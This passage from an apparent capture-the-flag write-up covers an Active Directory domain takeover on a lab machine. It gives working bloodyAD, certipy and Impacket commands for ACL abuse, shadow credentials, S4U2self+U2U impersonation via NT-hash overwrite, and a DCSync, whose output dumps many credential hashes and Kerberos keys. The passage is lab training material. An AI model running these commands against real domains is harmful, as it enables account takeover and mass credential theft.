            "Cleanup : $DN" | Out-File $Path -Append
        }
    }
}
```

It’s made up of three functions, and a loop that loops over each object in `OU=DCHERCULES`. For each object, if IT Support has `ExtendedRight` or `GenericAll` over it, it runs `CleanArtifacts` on each object inside of it. This function removes the `adminCount` settings and enables inheritance.

### Strategy

If `cleanup.ps1` is a copy of what’s running with the scheduled task (which isn’t a given, but I don’t see anywhere else to go), I can trigger the task and it will clear the admin protections for users in any OU where IT Support can change passwords. The DCHERCULES OU holds 45 users:

![image-20260919152307360](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/76343e24a483760b.png)

![image-20260919152307360](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260919152307360.webp)

That includes Forest Migration and IIS_Administrator:

![image-20260919152414631](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d1027dbe66ea3587.png)

![image-20260919152414631](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260919152414631.webp)

So I can trigger the job, and then immediately try the attack on IIS_Administrator again while it doesn’t have the `adminCount` protections.

### Account Takeover

I’ll start by triggering the cleanup job:

```
evil-winrm-py PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
```

It doesn’t work:

```
evil-winrm-py PS C:\Users\ashley.b\Documents> Get-ADUser iis_administrator -Properties Enabled,adminCount,userAccountControl | Format-List Name,Enabled,adminCount,userAccountControl


Name               : IIS_Administrator
Enabled            : False
adminCount         : 1
userAccountControl : 66050
```

The `adminCount` is still 1 (also worth noting that the account is disabled). That’s because the check makes sure that the IT Support group can change the password of the object before cleaning it. By default, that means it only cleans the Engineering Department.

I can give the IT Support group the same permissions that I gave auditor:

```
oxdf@hacky$ KRB5CCNAME=auditor.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB" "IT Support"
[+] IT Support has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

With that in place, I’ll run `aCleanup.ps1` again, and now the `adminCount` is gone:

```
evil-winrm-py PS C:\Users\ashley.b\Documents> Get-ADUser iis_administrator -Properties Enabled,adminCount,userAccountControl | Format-L
ist Name,Enabled,adminCount,userAccountControl


Name               : IIS_Administrator
Enabled            : False
adminCount         : 
userAccountControl : 66050
```

And I can enable the account:

```
oxdf@hacky$ KRB5CCNAME=auditor.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -k remove uac "IIS_Administrator" -f ACCOUNTDISABLE
[+] ['ACCOUNTDISABLE'] property flags removed from IIS_Administrator's userAccountControl
```

If I try to enable the account before running the `aCleanup.ps1` script, it will fail:

```
oxdf@hacky$ KRB5CCNAME=auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k remove uac "IIS_Administrator" -f ACCOUNTDISABLE
Traceback (most recent call last):
...[snip]...
badldap.commons.exceptions.LDAPModifyException: insufficientAccessRights for CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb (Attr) — Reason:(ERROR_DS_INSUFF_ACCESS_RIGHTS) Insufficient access rights to perform the operation.
```

`CleanArtifacts` also calls `SetAccessRuleProtection($False, $False)`, which turns inheritance back on so the `GenericAll` I put on the OU actually reaches the object.

Now I can get a shadow credential:

```sql
oxdf@hacky$ KRB5CCNAME=auditor.ccache certipy shadow auto -k -account iis_administrator -target dc.hercules.htb -dc-host dc.hercules.htb -ns 10.129.242.196
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'iis_administrator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7170f9af3c1640078fef8fba9fc962aa'
[*] Adding Key Credential with device ID '7170f9af3c1640078fef8fba9fc962aa' to the Key Credentials for 'iis_administrator'
[*] Successfully added Key Credential with device ID '7170f9af3c1640078fef8fba9fc962aa' to the Key Credentials for 'iis_administrator'
[*] Authenticating as 'iis_administrator' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'iis_administrator@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'iis_administrator.ccache'
[*] Wrote credential cache to 'iis_administrator.ccache'
[*] Trying to retrieve NT hash for 'iis_administrator'
[*] Restoring the old Key Credentials for 'iis_administrator'
[*] Successfully restored the old Key Credentials for 'iis_administrator'
[*] NT hash for 'iis_administrator': 72302a981e2fdfbb93a227dccbf907ee
```

It worked!

```sql
oxdf@hacky$ KRB5CCNAME=iis_administrator.ccache netexec smb DC.hercules.htb --use-kcache 
SMB         DC.hercules.htb 445    DC               [*]  x64 (name:DC) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         DC.hercules.htb 445    DC               [+] HERCULES.HTB\iis_administrator from ccache
```

## Auth as IIS_Webserver$

### Enumeration

BloodHound shows the same path as above:

![image-20260919153836604](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fcbc4b19bbaafcdf.png)

![image-20260919153836604](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260919153836604.webp)

The next step is to gain control over IIS_Webserver$.

### Account Takeover

I’ll use `bloodyAD` to change the password on the IIS_Webserver$ service account:

```
oxdf@hacky$ KRB5CCNAME=iis_administrator.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -k set password 'iis_webserver$' '0xdf0xdf...'
[+] Password changed successfully!
```

And I can auth:

```css
oxdf@hacky$ netexec smb DC.hercules.htb -u 'IIS_Webserver$' -p '0xdf0xdf...' -k
SMB         DC.hercules.htb 445    DC               [*]  x64 (name:DC) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         DC.hercules.htb 445    DC               [+] hercules.htb\IIS_Webserver$:0xdf0xdf...
```

## Shell as Administrator

### Background

The IIS_Webserver$ account has `AllowedToAct` over the DC machine account, which means it is set in the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer account. IIS_Webserver$ can “execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket ‘as’ this user” (quoting from the BloodHound window).

### Account Takeover

I’ll use `getST.py` to get a service ticket for the CIFS service impersonating the Administrator account on the DC, but it fails:

```sql
oxdf@hacky$ getST.py -spn 'cifs/DC.HERCULES.HTB' -impersonate Administrator 'HERCULES.HTB/IIS_Webserver$:0xdf0xdf...'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Probably user IIS_Webserver$ does not have constrained delegation permissions or impersonated user does not exist
```

It’s using S4U2Self, but that’s not enough. I need to add `-u2u` because the IIS_Webserver$ account has no SPN. With that, it still fails:

```sql
oxdf@hacky$ getST.py -spn 'cifs/DC.HERCULES.HTB' -impersonate Administrator 'HERCULES.HTB/IIS_Webserver$:0xdf0xdf...' -u2u
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user IIS_Webserver$ or initial TGT not forwardable
```

The S4U2self+U2U service ticket comes back encrypted with the account’s TGT session key rather than with the account’s long-term key, and S4U2Proxy can’t make use of it in that state.

I will overwrite the account’s NT hash with that session key, so that the account’s long-term key and the key the ticket is encrypted under are the same value.

I’ll get the NT hash of the password I used, ‘0xdf0xdf…’:

```
oxdf@hacky$ pypykatz crypto nt '0xdf0xdf...'
a5c8685a88599eca1c544cdd8e9149c9
```

Now I’ll get a TGT with that hash. Passing `-hashes` forces RC4, so the session key comes back as a 16 byte value that can be written straight into the NT hash field, which `describeTicket.py` confirms with `KeyType : rc4_hmac`:

```
oxdf@hacky$ getTGT.py 'HERCULES.HTB/IIS_Webserver$' -hashes :a5c8685a88599eca1c544cdd8e9149c9 -dc-ip 10.129.242.196
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IIS_Webserver$.ccache
oxdf@hacky$ describeTicket.py 'IIS_Webserver$.ccache'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 1d8c49e44271b88f39f59bc6d535e0b5
[*] User Name                     : IIS_Webserver$
[*] User Realm                    : HERCULES.HTB
[*] Service Name                  : krbtgt/HERCULES.HTB
[*] Service Realm                 : HERCULES.HTB
[*] Start Time                    : 20/09/2026 17:45:21 PM
[*] End Time                      : 21/09/2026 03:45:21 AM
[*] RenewTill                     : 21/09/2026 17:45:19 PM
[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : HYxJ5EJxuI859ZvG1TXgtQ==
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/HERCULES.HTB
[*]   Service Realm               : HERCULES.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

The session key is in the ticket, the top line of output from `describeTicket.py`. I’ll set the hash for the account to that hash:

```python
oxdf@hacky$ changepasswd.py -k 'HERCULES.HTB/IIS_Webserver$:0xdf0xdf...@dc.hercules.htb' -newhashes :1d8c49e44271b88f39f59bc6d535e0b5
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of HERCULES.HTB\IIS_Webserver$
[*] Connecting to DCE/RPC as HERCULES.HTB\IIS_Webserver$
[-] CCache file is not found. Skipping...
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

Now I can try to get a service ticket again, using the TGT:

```typescript
oxdf@hacky$ KRB5CCNAME=IIS_Webserver\$.ccache getST.py -spn 'cifs/DC.HERCULES.HTB' -impersonate Administrator 'HERCULES.HTB/IIS_Webserver$' -u2u -k -no-pass
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.HERCULES.HTB@HERCULES.HTB.ccache
```

### DC Sync

Now that I have a service ticket as Administrator, I’ll do a DC Sync attack to dump all the creds on the domain:

```ruby
oxdf@hacky$ KRB5CCNAME=Administrator@cifs_DC.HERCULES.HTB@HERCULES.HTB.ccache secretsdump.py -no-pass -k DC.HERCULES.HTB
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4d4922ac5f690741fd77d8937655a391
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:56855ee6b7570edefde6ac262200756e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
HERCULES\DC$:aes256-cts-hmac-sha1-96:88fb79ee960899e23659745a482984b1f793703661c72e2409b9bd8b5326c8d0
HERCULES\DC$:aes128-cts-hmac-sha1-96:201217d9fb7a22353ddf05badaa52304
HERCULES\DC$:des-cbc-md5:04ad5b8f4938fe10
HERCULES\DC$:plain_password_hex:f8a785fd2e5cfde82208daee0bf7b03f37955be1d99c5e6134cbac6705d1708378aa07b29b029d4df412a82ed4cac68606915d43d384e394abf13cc7c95ef661ede444f7aef30a43b729baaf99f7064bdd95ee9373b57f2f6903625fa106a99989f5a03e3d64b79a77b38c1908c2171370bce173187331058ab416b6066a980255b404e1712afa6f9520ffa575e5b29d58b60b3e56deaa124b44b156e35ea741e067a05af405679668a0a2927918b553032e00befd3f7e112a6e7fe099650f2938ea86424dc3f6330f19a1c3cf315b172f130cb2bc0dc5b644ba21163badf9ea5a7edebe6f25d0b9986521a8f1605dbc
HERCULES\DC$:aad3b435b51404eeaad3b435b51404ee:cf2505174768c1b74c1e924c867f18b6:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x3d5e7bf01a2b70286e032729ab8197a54bbc7efb
dpapi_userkey:0x85821cf6c8df5da4baec4cddb14dd489e2575d41
[*] NL$KM
 0000   CA 13 F3 6D 6C 27 79 AF  D4 44 6E 31 97 C3 CC D4   ...ml'y..Dn1....
 0010   2A 40 89 1F 96 48 67 22  BD 75 15 E1 79 DE 6A 10   *@...Hg".u..y.j.
 0020   27 90 AA 6E 3D EA F9 82  0E 21 D1 E6 49 C3 30 A7   '..n=....!..I.0.
 0030   04 E8 24 06 F5 E5 14 C9  4B DB 33 D5 6F 36 55 FA   ..$.....K.3.o6U.
NL$KM:ca13f36d6c2779afd4446e3197c3ccd42a40891f96486722bd7515e179de6a102790aa6e3deaf9820e21d1e649c330a704e82406f5e514c94bdb33d56f3655fa
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:56855ee6b7570edefde6ac262200756e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:aa9d05e554420b27186ffe97882303c2:::
hercules.htb\jessica.e:1113:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
hercules.htb\mikayla.a:1114:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
hercules.htb\stephanie.w:1115:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
hercules.htb\johanna.f:1116:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
hercules.htb\heather.s:1117:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
hercules.htb\camilla.b:1118:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
hercules.htb\iis_administrator:1119:aad3b435b51404eeaad3b435b51404ee:72302a981e2fdfbb93a227dccbf907ee:::
hercules.htb\taylor.m:1120:aad3b435b51404eeaad3b435b51404ee:952294bde2537ad3568133085a74d4b2:::
hercules.htb\fernando.r:1121:aad3b435b51404eeaad3b435b51404ee:e5ffd06fa27b1580198631558b564a61:::
hercules.htb\james.s:1122:aad3b435b51404eeaad3b435b51404ee:c23578256755003649011ee7c9fef7b2:::
hercules.htb\anthony.r:1123:aad3b435b51404eeaad3b435b51404ee:c23578256755003649011ee7c9fef7b2:::
hercules.htb\iis_webserver$:1124:aad3b435b51404eeaad3b435b51404ee:1d8c49e44271b88f39f59bc6d535e0b5:::
hercules.htb\iis_hadesapppool$:1125:aad3b435b51404eeaad3b435b51404ee:d5c8594cd155ad4d55ed928f8d158d33:::
hercules.htb\iis_apppoolidentity$:1126:aad3b435b51404eeaad3b435b51404ee:d5c8594cd155ad4d55ed928f8d158d33:::
hercules.htb\iis_defaultapppool$:1127:aad3b435b51404eeaad3b435b51404ee:d5c8594cd155ad4d55ed928f8d158d33:::
hercules.htb\auditor:1128:aad3b435b51404eeaad3b435b51404ee:a9285c625af80519ad784729655ff325:::
hercules.htb\vincent.g:1129:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
hercules.htb\nate.h:1130:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
hercules.htb\stephen.m:1131:aad3b435b51404eeaad3b435b51404ee:9aaaedcb19e612216a2dac9badb3c210:::
hercules.htb\mark.s:1132:aad3b435b51404eeaad3b435b51404ee:9aaaedcb19e612216a2dac9badb3c210:::
hercules.htb\elijah.m:1133:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
hercules.htb\angelo.o:1134:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
hercules.htb\ashley.b:1135:aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2:::
hercules.htb\clarissa.c:1136:aad3b435b51404eeaad3b435b51404ee:924ebb8d5e7f953241252cf64e84ee58:::
hercules.htb\winda.s:1137:aad3b435b51404eeaad3b435b51404ee:924ebb8d5e7f953241252cf64e84ee58:::
hercules.htb\rene.s:1138:aad3b435b51404eeaad3b435b51404ee:924ebb8d5e7f953241252cf64e84ee58:::
hercules.htb\will.s:1139:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
hercules.htb\zeke.s:1140:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
hercules.htb\adriana.i:1141:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
hercules.htb\tish.c:1142:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
hercules.htb\jennifer.a:1143:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
hercules.htb\shae.j:1144:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
hercules.htb\joel.c:1145:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
hercules.htb\jacob.b:1146:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
hercules.htb\web_admin:1147:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
hercules.htb\bob.w:1148:aad3b435b51404eeaad3b435b51404ee:8a65c74e8f0073babbfac6725c66cc3f:::
hercules.htb\ken.w:1149:aad3b435b51404eeaad3b435b51404ee:bbe608565f201166999904e40c967c7b:::
hercules.htb\johnathan.j:1150:aad3b435b51404eeaad3b435b51404ee:5809e5fc2ca162d909b15c62d7c3707c:::
hercules.htb\harris.d:1151:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
hercules.htb\ray.n:1152:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
hercules.htb\natalie.a:1153:aad3b435b51404eeaad3b435b51404ee:a023eb224e137b1c28de1a50d12519d5:::
hercules.htb\ramona.l:1154:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
hercules.htb\fiona.c:1155:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
hercules.htb\patrick.s:1156:aad3b435b51404eeaad3b435b51404ee:08cbc306325b2ef9da7bbdb85e528613:::
hercules.htb\tanya.r:1157:aad3b435b51404eeaad3b435b51404ee:08cbc306325b2ef9da7bbdb85e528613:::
Admin:5103:aad3b435b51404eeaad3b435b51404ee:ef0e8c35557ed7790eb8499fc1c24fb6:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf2505174768c1b74c1e924c867f18b6:::
WINSRV01-2016$:1158:aad3b435b51404eeaad3b435b51404ee:989f931779b1379c6345b6e2773244a0:::
WINSRV02-2016$:1159:aad3b435b51404eeaad3b435b51404ee:bb32a35136321fb9cd41374a1a62b14a:::
WINSRV03-2016$:1160:aad3b435b51404eeaad3b435b51404ee:68f03b6856cf02e7c1ddac0758ca6b25:::
ENTERPRISE01-8.1$:1161:aad3b435b51404eeaad3b435b51404ee:dc6d40433d403e925d4f1848ceeef91f:::
ENTERPRISE02-8.1$:1162:aad3b435b51404eeaad3b435b51404ee:90ccdd29525c3b6d29428f932f754171:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7ee4577fd299aa0fa5b8a0643426ff61501f42201f769afce56d633f29044168
Administrator:aes128-cts-hmac-sha1-96:6d25866356feeea0abf920fd58fccf03
Administrator:des-cbc-md5:e5d92fc1b3704a15
krbtgt:aes256-cts-hmac-sha1-96:e913bbe5bca77dda3c1ae1c2d612e031acc27c6c20dfb02b14844da62d074ee2
krbtgt:aes128-cts-hmac-sha1-96:b88e36f733e6b0d30ce43235ba89842b
krbtgt:des-cbc-md5:ad73d9709ee0164f
hercules.htb\jessica.e:aes256-cts-hmac-sha1-96:d75d7b181f5da8187032be2698f08fa068ae496e043efe75e004b485b11eab5b
hercules.htb\jessica.e:aes128-cts-hmac-sha1-96:2ff374b80ec5a635f07fc2ff40ba8588
hercules.htb\jessica.e:des-cbc-md5:9eb36b2602ad5738
hercules.htb\mikayla.a:aes256-cts-hmac-sha1-96:38e613645139c52a90192e5e2835438b4e9e1b6d6e78dc2c9945d8cc58b8388c
hercules.htb\mikayla.a:aes128-cts-hmac-sha1-96:118757fa3074dfcb09ae0471a525872a
hercules.htb\mikayla.a:des-cbc-md5:01ab1f166edfcb3e
hercules.htb\stephanie.w:aes256-cts-hmac-sha1-96:f41817416bbdeec50057c3a321cfe641f4cba93efb8a2f24ab05bb5b315e235a
hercules.htb\stephanie.w:aes128-cts-hmac-sha1-96:0343a7088e8febcd6baf33636cb6ae65
hercules.htb\stephanie.w:des-cbc-md5:98a4b089dc019bae
hercules.htb\johanna.f:aes256-cts-hmac-sha1-96:5a87a338af05781b237894a70dc1634ec2228d7951e344f6c1109f375a3d38ec
hercules.htb\johanna.f:aes128-cts-hmac-sha1-96:c9013d65e6f24316f3e2f77974740e09
hercules.htb\johanna.f:des-cbc-md5:313b293ef8c7259e
hercules.htb\heather.s:aes256-cts-hmac-sha1-96:c3315d44eee3e579e2e7b0a054b428b045b6b30f40ce0a1aa5676344f3fcafe8
hercules.htb\heather.s:aes128-cts-hmac-sha1-96:28bc4f7ad97dec4c09022e13792a88fe
hercules.htb\heather.s:des-cbc-md5:d0cdbf92a7a22a75
hercules.htb\camilla.b:aes256-cts-hmac-sha1-96:d928f3e420736b8e51a2fb95473bf6d82327d8936d60003ec812ac70fd65d599
hercules.htb\camilla.b:aes128-cts-hmac-sha1-96:198de4ffffff05c776c29d983663d625
hercules.htb\camilla.b:des-cbc-md5:ea43c15246cbe3a4
hercules.htb\iis_administrator:aes256-cts-hmac-sha1-96:88fbca83c9c68e7be600052ecda89a647898937f966210cdb832f7c43f2ffd5f
hercules.htb\iis_administrator:aes128-cts-hmac-sha1-96:6d235072f7e9d1ebf86ce618f95efd13
hercules.htb\iis_administrator:des-cbc-md5:570ea44a0246cb45
hercules.htb\taylor.m:aes256-cts-hmac-sha1-96:07b98ea839deca57827cf6f3db757d368150878a55746ffc3804e9a672e17e23
hercules.htb\taylor.m:aes128-cts-hmac-sha1-96:31abfeca89272d6ef2d916a371fc7c95
hercules.htb\taylor.m:des-cbc-md5:2068610d3898f14a
hercules.htb\fernando.r:aes256-cts-hmac-sha1-96:d51bfa7ca7ea238c5c833d4e16493694a765ffdf49ea28b7ae210a4248e9e1c5
hercules.htb\fernando.r:aes128-cts-hmac-sha1-96:46d8c64932678ef16f9f6725bc71a648
hercules.htb\fernando.r:des-cbc-md5:dc4961ef40b9f8ad
hercules.htb\james.s:aes256-cts-hmac-sha1-96:cd5f05ea75cb4a942fecf5f4562fd6bcb3a7dd19fc15a5f0a147bf3ff84b3753
hercules.htb\james.s:aes128-cts-hmac-sha1-96:ca009a69ebcff1792b1f3a2cb7dc9a57
hercules.htb\james.s:des-cbc-md5:760d913be07c97ba
hercules.htb\anthony.r:aes256-cts-hmac-sha1-96:93d66010169946e498aef06eaf0b9ba2611f45b8e38aa0208fc0b067bd1d4668
hercules.htb\anthony.r:aes128-cts-hmac-sha1-96:51403f6d7e2f363eab47e5945b367357
hercules.htb\anthony.r:des-cbc-md5:d93de3c13b100bc7
hercules.htb\iis_hadesapppool$:aes256-cts-hmac-sha1-96:2b0ddb8ee053dd81ab3f56ff1f3803e72fa5dad6106f2e3e5da910956c5ca05c
hercules.htb\iis_hadesapppool$:aes128-cts-hmac-sha1-96:042ceee5da6879a9a75e4d39a8336539
hercules.htb\iis_hadesapppool$:des-cbc-md5:f7d05202c4404fcb
hercules.htb\iis_apppoolidentity$:aes256-cts-hmac-sha1-96:48c4b10a55ddd53c38567b93d29854aac995af72fa3bc6c2a48a2fcd5694d8d0
hercules.htb\iis_apppoolidentity$:aes128-cts-hmac-sha1-96:58ea15d4f45d6e8c95613774f2a520ab
hercules.htb\iis_apppoolidentity$:des-cbc-md5:5d89bcc45d9d9738
hercules.htb\iis_defaultapppool$:aes256-cts-hmac-sha1-96:62ff786d017770f69241f04296a65858ffc17976e5f23c623a98ac7a214d86c0
hercules.htb\iis_defaultapppool$:aes128-cts-hmac-sha1-96:5664d1352a5ad8107f4221c802187958
hercules.htb\iis_defaultapppool$:des-cbc-md5:681092c1d9e99285
hercules.htb\auditor:aes256-cts-hmac-sha1-96:ae7fa93d07857c57a1f447a11639ca11c2c37975b8c7b7cc9a13c10dd1048b87
hercules.htb\auditor:aes128-cts-hmac-sha1-96:0676ae731f875f6ff8b3caeb8de61b2d
hercules.htb\auditor:des-cbc-md5:f13eec86b515b662
hercules.htb\vincent.g:aes256-cts-hmac-sha1-96:42e31cb44638ae124cfb02a810a8d49c6376616c93ea51e43ac2f7799a668132
hercules.htb\vincent.g:aes128-cts-hmac-sha1-96:979c95cba656605aeb3c1141ea13c013
hercules.htb\vincent.g:des-cbc-md5:c4262a762902c8cb
hercules.htb\nate.h:aes256-cts-hmac-sha1-96:ccd5e253768c410bb474a34f5a5182a514f3e5312518bec2652fe164f029f652
hercules.htb\nate.h:aes128-cts-hmac-sha1-96:55ace1e82eaf785b3c92429725ff6721
hercules.htb\nate.h:des-cbc-md5:a2f7739df264581a
hercules.htb\stephen.m:aes256-cts-hmac-sha1-96:1ab0ef54279ae5799ecfbd6fda5da053b38200bfe4770a80bdb3875fbaa945db
hercules.htb\stephen.m:aes128-cts-hmac-sha1-96:bbc81c6e239c77655128bdc1c344824c
hercules.htb\stephen.m:des-cbc-md5:d051757cb9e002ae
hercules.htb\mark.s:aes256-cts-hmac-sha1-96:774fec322580dc16e52c7d51e0674f0ed3914a22e4eb0113ab0fba71840b018a
hercules.htb\mark.s:aes128-cts-hmac-sha1-96:e8a5008fd4504f0720d572f59a877efb
hercules.htb\mark.s:des-cbc-md5:97c1549ea840d625
hercules.htb\elijah.m:aes256-cts-hmac-sha1-96:e98550eac32381d51c41517eefec1cd4446e3e9bd951e08ae3c066a096f3fc7d
hercules.htb\elijah.m:aes128-cts-hmac-sha1-96:3b6be8c40a29ef71fd368b91305331a7
hercules.htb\elijah.m:des-cbc-md5:98206254381a76ce
hercules.htb\angelo.o:aes256-cts-hmac-sha1-96:3f48419ceb427233e0f785dadbc8061ea5321914aae7c48d9d37a9ccf24ddb9b
hercules.htb\angelo.o:aes128-cts-hmac-sha1-96:977b7d37961eab09a8cf99b54f6870bc
hercules.htb\angelo.o:des-cbc-md5:19ea9dceb562d64f
hercules.htb\ashley.b:aes256-cts-hmac-sha1-96:4642fc3846aa1beb5ab300ac26de6a30955461b85768b5226ed677e96fbc15f7
hercules.htb\ashley.b:aes128-cts-hmac-sha1-96:2db1f8377e4fbf4334179397fc97779a
hercules.htb\ashley.b:des-cbc-md5:3d8fb086f24064f2
hercules.htb\clarissa.c:aes256-cts-hmac-sha1-96:55e2737cb7ee0780cfbd9bcbfd1a931797774e8ed5c9586366ddf66fa6c59b30
hercules.htb\clarissa.c:aes128-cts-hmac-sha1-96:16574d42be04708b10478a0160c7d5bf
hercules.htb\clarissa.c:des-cbc-md5:897cc42f3425793d
hercules.htb\winda.s:aes256-cts-hmac-sha1-96:b0a7c3665d08afdb3c9e69d2da1ea86aa302e6bfa9c9c4a997d4949818a60239
hercules.htb\winda.s:aes128-cts-hmac-sha1-96:95e93701d05ee7b165c6999515710f85
hercules.htb\winda.s:des-cbc-md5:dacbd3fea76440ea
hercules.htb\rene.s:aes256-cts-hmac-sha1-96:a5e77806c53a03e6cdc3e039c57651bc91fdb50a90456bbd6df3dbce4326b7e9
hercules.htb\rene.s:aes128-cts-hmac-sha1-96:4aef767f89075713fbe8003649da0326
hercules.htb\rene.s:des-cbc-md5:54e9835407767a46
hercules.htb\will.s:aes256-cts-hmac-sha1-96:a3431716086f8b75686d235cab875b28d71a406834da2e13278abedb0138b0a6
hercules.htb\will.s:aes128-cts-hmac-sha1-96:60fc61cab84a22fb214819ce20c12e1c
hercules.htb\will.s:des-cbc-md5:25ae8f7673e0a70e
hercules.htb\zeke.s:aes256-cts-hmac-sha1-96:e2382e136cfc10abaf6827c30145a72a77b54a19ea835251e9f81f6fd687fc71
hercules.htb\zeke.s:aes128-cts-hmac-sha1-96:c304abccef27cb190fb6cc99308408f5
hercules.htb\zeke.s:des-cbc-md5:d36e31299102583d
hercules.htb\adriana.i:aes256-cts-hmac-sha1-96:f66e40133789f42dc3c1d54077784c965a45fdd530261ba478eb18f3aba68952
hercules.htb\adriana.i:aes128-cts-hmac-sha1-96:77660edd07df04b5e3b827308d628f1b
hercules.htb\adriana.i:des-cbc-md5:c1732380e394f45b
hercules.htb\tish.c:aes256-cts-hmac-sha1-96:d40b3d0a9a87be374c9e042155cc47cdadbe5d1fab673ee46b81a170cd756586
hercules.htb\tish.c:aes128-cts-hmac-sha1-96:d398f20152253f26fdc9153c54d184a3
